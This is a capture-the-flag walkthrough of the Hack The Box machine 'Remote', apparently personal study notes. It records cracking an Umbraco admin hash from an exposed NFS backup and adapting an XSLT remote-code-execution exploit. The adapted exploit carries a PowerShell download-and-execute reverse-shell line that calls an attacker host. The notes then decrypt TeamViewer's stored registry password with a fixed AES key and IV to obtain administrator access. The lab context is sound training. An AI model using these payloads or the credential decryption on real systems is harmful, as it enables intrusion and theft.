#crest-crt #windows

# Story
1. Check the ports
2. The machine hosts http and NSF
3. Check the website, there is a login form and the website is hosted by Umbraco
4. Check the NSF, we can mount it on our machine so that we can see whats in it
5. Umbraco.config has some imformation about login password
6. We know the version of Umbraco after login
7. There is a vuln for the specific version
8. Prepare revshell setup and get user flag
9. Check what is running in the system
10. TeamViewer is running
11. Check metasploit code for teamviewer attack
12. We can check registory for password
13. Decrypt the password
14. Use evil-winrm to get root shell

# Enumeration
## Nmap
```
nmap -sC -sV -Pn remote.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 06:18 EST
Nmap scan report for remote.htb (10.129.189.146)
Host is up (0.12s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-20T11:19:32
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.72 seconds
```

## FTP Port 21

Anonymous login allowed
```
ftp remote.htb
Connected to remote.htb.
220 Microsoft FTP Service
Name (remote.htb:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49684|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

## Http Port 80


![[Pasted image 20230220202457.png]]

Umbraco HQ

https://github.com/umbraco/Umbraco-CMS

### login
/umbraco has login

![[Pasted image 20230220203431.png]]

## Feroxbuster
nothing interesting

## SMB
could not access using smbmap,crackmapexec,smbclient.

## RPC
rpcclient no luck

## NSF server port 2049
check paths that can be mounted

```
showmount -e remote.htb   
Export list for remote.htb:
/site_backups (everyone)
```

```
sudo mount -t nfs remote.htb:/site_backups /mnt/
```

## Check files

/AppData/Umbraco.config
strings
```
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
```

sha1
`b8be16afba8c314ad33d812f22a04991b90e2aaa`

## hashcat
```
root@kali# cat admin.sha1 b8be16afba8c314ad33d812f22a04991b90e2aaa root@kali# hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force hashcat (v5.1.0) starting...
baconandcheese
```

# Foothold
## After login
![[Pasted image 20230220214852.png]]


## Searchsploit

```
searchsploit umbraco                            
------------------------- ---------------------------------
 Exploit Title           |  Path
------------------------- ---------------------------------
Umbraco CMS - Remote Com | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Au | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Rem | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Dire | aspx/webapps/50241.py
Umbraco CMS SeoChecker P | php/webapps/44988.txt
Umbraco v8.14.1 - 'baseU | aspx/webapps/50462.txt
------------------------- ---------------------------------
Shellcodes: No Results
```
Use 46153.py

### Modify exploit
The below is the original payload
``` python
46153.py
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
```

we need to modify it to
``` python
poc_ping.py
# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "/c ping 10.10.14.3"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';
```

### Ping PoC

On Kali Shell 1
```
python3 poc_ping.py
Start
[]
End
```

On Kali Shell 2
```
sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:16:24.579949 IP remote.htb > 10.10.14.3: ICMP echo request, id 1, seq 1, length 40
08:16:24.579968 IP 10.10.14.3 > remote.htb: ICMP echo reply, id 1, seq 1, length 40
08:16:25.584508 IP remote.htb > 10.10.14.3: ICMP echo request, id 1, seq 2, length 40
08:16:25.584522 IP 10.10.14.3 > remote.htb: ICMP echo reply, id 1, seq 2, length 40
08:16:26.597504 IP remote.htb > 10.10.14.3: ICMP echo request, id 1, seq 3, length 40
08:16:26.597518 IP 10.10.14.3 > remote.htb: ICMP echo reply, id 1, seq 3, length 40
08:16:27.613177 IP remote.htb > 10.10.14.3: ICMP echo request, id 1, seq 4, length 40
08:16:27.613190 IP 10.10.14.3 > remote.htb: ICMP echo reply, id 1, seq 4, length 40
```

## Get reverse shell
Replace the string cmd part
```python
revshell.py
string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring(\'http://10.10.14.17:8000/shell.ps1\')"
```
needed to escape quotes in downloadstring

## Shell
```
PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```

## User flag
```
PS C:\Users\Public> type user.txt
```

# Privilege Escalation
## Enumeration
reference 
https://0xdf.gitlab.io/2020/09/05/htb-remote.html

### Check tasks
```
PS C:\> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0                            0          8 K
System                           4                            0        140 K
Registry                        88                            0     20,364 K
smss.exe                       292                            0      1,240 K
csrss.exe                      372                            0      5,252 K
wininit.exe                    480                            0      6,980 K
csrss.exe                      488                            1      4,764 K
winlogon.exe                   552                            1     17,864 K
services.exe                   616                            0      7,944 K
lsass.exe                      636                            0     14,132 K
svchost.exe                    736                            0     14,528 K
fontdrvhost.exe                744                            0      4,024 K
fontdrvhost.exe                752                            1      4,336 K
svchost.exe                    844                            0     10,184 K
dwm.exe                        928                            1     38,668 K
svchost.exe                    964                            0     60,080 K
svchost.exe                     68                            0     17,080 K
svchost.exe                     64                            0     16,024 K
svchost.exe                    396                            0     20,036 K
svchost.exe                   1092                            0     19,344 K
vm3dservice.exe               1132                            0      6,636 K
svchost.exe                   1216                            0     23,220 K
svchost.exe                   1392                            0      8,916 K
svchost.exe                   1548                            0     15,840 K
svchost.exe                   1728                            0      7,448 K
spoolsv.exe                   1372                            0     16,452 K
svchost.exe                   1460                            0     10,960 K
svchost.exe                   1572                            0     32,612 K
svchost.exe                    656                            0     12,616 K
inetinfo.exe                  2072                            0     15,552 K
svchost.exe                   2140                            0      8,624 K
vmtoolsd.exe                  2228                            0     18,748 K
VGAuthService.exe             2236                            0     10,640 K
svchost.exe                   2244                            0      7,504 K
svchost.exe                   2256                            0     12,512 K
TeamViewer_Service.exe        2272                            0     19,688 K
MsMpEng.exe                   2292                            0    109,480 K
svchost.exe                   2348                            0     12,384 K
nfssvc.exe                    2460                            0      5,320 K
dllhost.exe                   3108                            0     13,508 K
WmiPrvSE.exe                  3224                            0     18,620 K
msdtc.exe                     3456                            0     10,424 K
LogonUI.exe                   3616                            1     46,724 K
SearchIndexer.exe             4648                            0     18,604 K
svchost.exe                   3836                            0     13,704 K
w3wp.exe                      4008                            0    348,708 K
cmd.exe                       2996                            0      3,700 K
conhost.exe                   5716                            0     12,264 K
powershell.exe                4196                            0    126,888 K
tasklist.exe                  7632                            0      7,600 K
```

Teamviewer is something unusual.

### Teamviewer Location
```
Directory: C:\Program Files (x86)\TeamViewer


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        2/27/2020  10:35 AM                Version7
```


### TeamViewer Version7

Check the metasploit exploit code.
```
https://github.com/rapid7/metasploit-framework/blob/master//modules/post/windows/gather/credentials/teamviewer_passwords.rb
```

Registry is the key for exploitation.
```
cd HKLM:\software\wow6432node\teamviewer\version7
```

In version7 folder we can get itemproperty.
```
get-itemproperty -path .


StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B9BA6E}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1649418879
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
PSChildName               : version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry
```

We extract SecurityPassword
```
(get-itemproperty -path .).SecurityPasswordAES
255
155
28
115
214
107
206
49
172
65
62
174
19
27
70
79
88
47
108
226
209
225
243
218
126
141
55
107
38
57
78
91
```

## Decode AES
In the same github, we see the part where the metasploit code decrypt the ciphered text, so we write some quick python code.

```python
#!/usr/bin/env python3
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
encrypted = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 
                    126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key=key,mode=AES.MODE_CBC, IV=iv)
password = aes.decrypt(encrypted).decode("utf-16").rstrip("\x00")
print(password)
                 
```
`!R3m0te!` is the password

## Crackmap
```
 crackmapexec smb remote.htb -u administrator -p '!R3m0te!'
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         remote.htb      445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         remote.htb      445    REMOTE           [+] remote\administrator:!R3m0te! (Pwn3d!)                                                                                      
                                  
```

## Evil-winrm
`evil-winrm -u administrator -p '!R3m0te!' -i remote.htb
`
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```